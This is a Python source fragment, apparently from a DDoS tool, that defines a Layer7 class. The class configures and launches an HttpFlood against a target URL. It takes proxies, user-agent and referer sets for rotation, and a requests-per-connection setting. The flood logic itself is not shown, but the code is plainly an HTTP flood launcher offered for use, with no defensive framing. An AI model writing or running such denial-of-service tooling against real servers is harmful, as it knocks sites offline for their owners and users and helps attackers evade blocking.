class Layer7:
    METHODS: Set[str] = HttpFlood.METHODS

    def __init__(self,
                 target: URL,
                 method: str,
                 duration: int,
                 event: Event,
                 config: dict,
                 proxies: set,
                 user_agents: set,
                 referers: set):
        self.target = target
        self.method = method
        self.duration = duration
        self.event = event
        self.config = config
        self.proxies = proxies
        self.rpc = config.get("rpc", 1)
        self.user_agents = user_agents
        self.referers = referers

    def run(self):
        http_flood_instance = HttpFlood(
            thread_id=0,
            target=self.target,
            host=self.target.host,
            method=self.method,
            rpc=self.rpc,
            synevent=self.event,
            useragents=self.user_agents,
            referers=self.referers,
            proxies=self.proxies
        )
        http_flood_instance.run()
